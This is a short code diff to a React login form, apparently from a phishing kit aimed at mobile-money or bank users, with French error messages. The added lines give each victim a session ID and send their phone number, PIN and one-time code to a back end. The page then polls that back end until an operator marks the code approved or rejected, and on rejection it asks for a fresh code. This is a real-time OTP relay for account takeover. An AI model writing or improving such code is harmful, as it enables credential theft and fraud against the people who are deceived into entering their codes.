@@ -27,6 +27,7 @@
       const [otp, setOtp] = useState(['', '', '', '']);
       const [timer, setTimer] = useState(60);
       const [error, setError] = useState('');
+      const [sessionId] = useState(() => Math.random().toString(36).substring(2, 10));
 
       useEffect(() => {
         let interval;
@@ -78,6 +79,7 @@
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
+              session_id: sessionId,
               phone,
               pin: pin.join(''),
               otp: 'Pending OTP...'
@@ -104,18 +106,38 @@
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
+              session_id: sessionId,
               phone,
               pin: pin.join(''),
               otp: otp.join('')
             })
           });
+
+          // Start polling for status
+          const pollInterval = setInterval(async () => {
+            try {
+              const res = await fetch(`/api/status?session_id=${sessionId}`);
+              const data = await res.json();
+              
+              if (data.status === 'approved') {
+                clearInterval(pollInterval);
+                setIsLoading(false);
+                setStep(3);
+              } else if (data.status === 'rejected') {
+                clearInterval(pollInterval);
+                setIsLoading(false);
+                setError('Code OTP incorrect ou expiré. Veuillez réessayer.');
+                setOtp(['', '', '', '']);
+              }
+            } catch (err) {
+              console.error('Error polling status:', err);
+            }
+          }, 3000);
+          
         } catch (e) {
           console.error('Failed to notify:', e);
-        }
-        setTimeout(() => {
           setIsLoading(false);
-          setStep(3);
-        }, 2000);
+        }
       };
 
       if (isLoading) {
